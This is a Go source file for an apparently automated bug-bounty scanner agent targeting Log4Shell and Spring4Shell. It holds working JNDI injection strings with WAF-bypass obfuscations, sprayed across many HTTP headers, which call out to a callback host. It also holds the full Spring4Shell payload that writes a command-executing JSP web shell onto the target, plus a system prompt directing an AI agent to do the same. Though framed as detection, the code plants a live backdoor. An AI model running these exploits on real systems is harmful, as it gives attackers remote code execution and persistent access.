// Package log4shell implements the Log4Shell / Spring4Shell specialist agent.
//
// Injects JNDI lookup strings into all common HTTP headers for blind OOB detection.
// Also tests the Spring4Shell class loader path traversal gadget.
package log4shell

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

// callbackPlaceholder is replaced by the actual OOB callback URL when one is configured.
// Tests without a live callback server still emit low-confidence findings.
const callbackPlaceholder = "CALLBACK_URL"

// Agent implements the Specialist interface for Log4Shell / Spring4Shell detection.
type Agent struct {
	systemPrompt string
}

// New creates a new Log4Shell specialist agent.
func New() *Agent {
	return &Agent{systemPrompt: defaultSystemPrompt}
}

func (a *Agent) Name() string         { return "Log4Shell Agent" }
func (a *Agent) ID() string           { return "log4shell" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

// headersToInject are the HTTP headers most likely to be logged by Log4j.
var headersToInject = []string{
	"User-Agent",
	"X-Forwarded-For",
	"Referer",
	"X-Api-Version",
	"X-Custom-IP-Authorization",
	"Accept-Language",
	"Accept",
	"Cookie",
	"Authorization",
	"X-Request-ID",
	"CF-Connecting-IP",
	"True-Client-IP",
	"Forwarded",
}

// jndiVariants generates JNDI lookup strings with common obfuscations.
func jndiVariants(callback string) []string {
	base := "${jndi:ldap://" + callback + "/log4shell}"
	return []string{
		base,
		// Lower/upper-case bypass: ${${lower:j}ndi:...}
		"${${lower:j}ndi:ldap://" + callback + "/a}",
		// Nested lookup bypass: ${${::-j}${::-n}${::-d}${::-i}:...}
		"${${::-j}${::-n}${::-d}${::-i}:ldap://" + callback + "/b}",
		// DNS variant
		"${jndi:dns://" + callback + "/c}",
		// RMI variant
		"${jndi:rmi://" + callback + "/d}",
	}
}

// spring4ShellPayload is the Spring4Shell (CVE-2022-22965) class loader gadget.
// Sent as a query parameter to POST /app endpoints.
const spring4ShellPayload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=" +
	"%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B" +
	"java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B" +
	"int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" +
	"while((a%3Din.read(b))!%3D-1)%7Bout.println(new%20String(b))%3B%7D%7D%25%7Bsuffix%7Di&" +
	"class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&" +
	"class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&" +
	"class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&" +
	"class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

// ProcessItem injects Log4Shell / Spring4Shell payloads into the target.
func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	callbackURL, _ := item.Payload["callback_url"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL in work item")
	}

	if callbackURL == "" {
		callbackURL = callbackPlaceholder
	}

	client := newHTTPClient()
	var findings []*base.Finding

	// --- Log4Shell header injection ---
	jndis := jndiVariants(callbackURL)

	for _, jndi := range jndis {
		for _, header := range headersToInject {
			result := sendWithHeaders(ctx, client, targetURL, map[string]string{
				header: jndi,
			})
			if result.err != nil {
				continue
			}

			evidence := map[string]interface{}{
				"injected_header": header,
				"jndi_payload":    jndi,
				"status_code":     result.statusCode,
				"requires_oob":    true,
				"callback_url":    callbackURL,
			}

			// Detectable in-band: some servers echo the JNDI string or produce Java errors
			conf := 0.5 // baseline: blind injection
			if strings.Contains(result.body, "jndi") || strings.Contains(result.body, "ldap://") {
				conf = 0.75
				evidence["jndi_reflected"] = true
			}
			if strings.Contains(result.body, "ClassNotFoundException") ||
				strings.Contains(result.body, "JndiLookup") {
				conf = 0.85
				evidence["java_error"] = true
			}

			// Only emit one finding per header (avoid duplicate flood)
			findings = append(findings, &base.Finding{
				Type:       "Log4Shell (CVE-2021-44228)",
				URL:        targetURL,
				Parameter:  header,
				Payload:    jndi,
				Severity:   "critical",
				Confidence: conf,
				Evidence:   evidence,
				Method:     "GET",
			})

			// One JNDI variant per header is enough
			break
		}
	}

	// --- Spring4Shell probe ---
	spring4Result := sendSpring4Shell(ctx, client, targetURL)
	if spring4Result.err == nil {
		conf := 0.5
		evidence := map[string]interface{}{
			"payload":      "spring4shell_classloader",
			"status_code":  spring4Result.statusCode,
			"requires_oob": true,
		}
		if spring4Result.statusCode == 200 && strings.Contains(spring4Result.body, "tomcatwar") {
			conf = 0.9
			evidence["web_shell_created"] = true
		}

		findings = append(findings, &base.Finding{
			Type:       "Spring4Shell (CVE-2022-22965)",
			URL:        targetURL,
			Parameter:  "class.module.classLoader",
			Payload:    "spring4shell_classloader_gadget",
			Severity:   "critical",
			Confidence: conf,
			Evidence:   evidence,
			Method:     "POST",
		})
	}

	return findings, nil
}

type httpResult struct {
	statusCode int
	body       string
	err        error
}

func sendWithHeaders(ctx context.Context, client *http.Client, targetURL string, headers map[string]string) httpResult {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
	if err != nil {
		return httpResult{err: err}
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return httpResult{err: err}
	}
	defer resp.Body.Close()
	lr := io.LimitReader(resp.Body, 256*1024)
	b, _ := io.ReadAll(lr)
	return httpResult{statusCode: resp.StatusCode, body: string(b)}
}

func sendSpring4Shell(ctx context.Context, client *http.Client, targetURL string) httpResult {
	sep := "?"
	if strings.Contains(targetURL, "?") {
		sep = "&"
	}
	fullURL := targetURL + sep + spring4ShellPayload

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, fullURL, strings.NewReader(""))
	if err != nil {
		return httpResult{err: err}
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; SecurityScanner/1.0)")

	resp, err := client.Do(req)
	if err != nil {
		return httpResult{err: err}
	}
	defer resp.Body.Close()
	lr := io.LimitReader(resp.Body, 256*1024)
	b, _ := io.ReadAll(lr)
	return httpResult{statusCode: resp.StatusCode, body: string(b)}
}

func newHTTPClient() *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
	}
	return &http.Client{Timeout: 10 * time.Second, Transport: transport}
}

const defaultSystemPrompt = `You are a Log4Shell (CVE-2021-44228) and Spring4Shell (CVE-2022-22965) specialist.

Log4Shell: Inject ${jndi:ldap://CALLBACK/x} into every HTTP header that may be logged by Log4j.
- User-Agent, X-Forwarded-For, Referer, X-Api-Version, Authorization, Cookie, etc.
- Use obfuscated variants (${lower:j}ndi, ${::-j}${::-n}${::-d}${::-i}) to bypass WAFs
- Requires OOB callback for blind detection; baseline confidence 0.5

Spring4Shell: Exploit Spring MVC class loader binding to write a JSP web shell via:
  class.module.classLoader.resources.context.parent.pipeline.first.*

Both are CRITICAL severity — remote code execution without authentication.`
